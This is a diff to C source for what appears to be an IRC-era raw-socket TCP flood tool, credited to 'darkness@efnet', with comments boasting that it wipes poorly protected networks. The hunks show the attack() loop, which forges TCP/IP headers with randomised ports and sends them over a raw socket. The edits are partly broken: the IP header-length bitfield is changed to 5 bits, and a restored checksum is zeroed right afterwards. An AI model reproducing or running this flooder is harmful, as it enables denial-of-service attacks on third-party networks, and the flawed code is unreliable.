@@ -55,7 +55,7 @@ By darkness@efnet. // greetz vae@efnet.
 
 // Code configuration, don't modify unless you know what you're doing!
 #define PHI                           0xedc12       // Number generation seed
-#define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper,
+#define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper.
 #define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
 #define EPHEMERAL_PORT_MIN            16383         // Min ephemeral TCP port randomization
 #define EPHEMERAL_PORT_MAX            49152         // Max ephemeral TCP port randomization
@@ -97,7 +97,7 @@ unsigned int b = 0;
 
 struct ip
 {
-    unsigned int ip_hl : 4;         /* header length */
+    unsigned int ip_hl : 5;         /* header length */
     unsigned int ip_v : 4;          /* version */
     unsigned char ip_tos;           /* type of service */
     unsigned short ip_len;          /* total length */
@@ -130,8 +130,8 @@ struct tcphdr2
     unsigned short th_dport;        /* destination port */
     unsigned int th_seq;            /* sequence number */
     unsigned int th_ack;            /* acknowledgement number */
-    unsigned char th_x2 : 4;          /* (unused) */
-    unsigned char th_off : 4;         /* data offset */
+    unsigned char th_x2 : 4;        /* (unused) */
+    unsigned char th_off : 4;       /* data offset */
     unsigned char th_flags;         /* flags */
     unsigned short th_win;          /* window */
     unsigned short th_sum;          /* checksum */
@@ -505,6 +505,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
             xf_tcphdr->th_sport = htons(((rand_cmwc() % EPHEMERAL_PORT_MIN) + EPHEMERAL_PORT_MAX));
             ps_tcphdr->th_sport = xf_tcphdr->th_sport;
         }
+
         // Calculate IP len
         xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
@@ -517,10 +518,10 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
         // Calculate TCP checksum
-        //xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
         xf_tcphdr->th_sum = 0;
 
-#ifdef DEBUG_TCP
+        #ifdef DEBUG_TCP
         printf("> Loop Pseudo HDR: %u\n", sizeof(struct ph));
         printf("> Loop IP HDR: %u\n", sizeof(struct ip));
         printf("> Loop TCP HDR: %u\n", sizeof(struct tcphdr2));
@@ -528,7 +529,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         printf("> Loop Databytes: %u\n", databytes);
         printf("> Loopth_sum: %u\n", xf_tcphdr->th_sum);
         printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-#endif
+        #endif
 
         // Send our newly modified loop packet.
         sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
@@ -541,6 +542,7 @@ int main(int argc, char** argv)
     unsigned char flags, ttl;
     int tmp = 1;
     const int* val = &tmp;
+    
 
     // Seed number randomization features.
     init_rand(time(NULL));
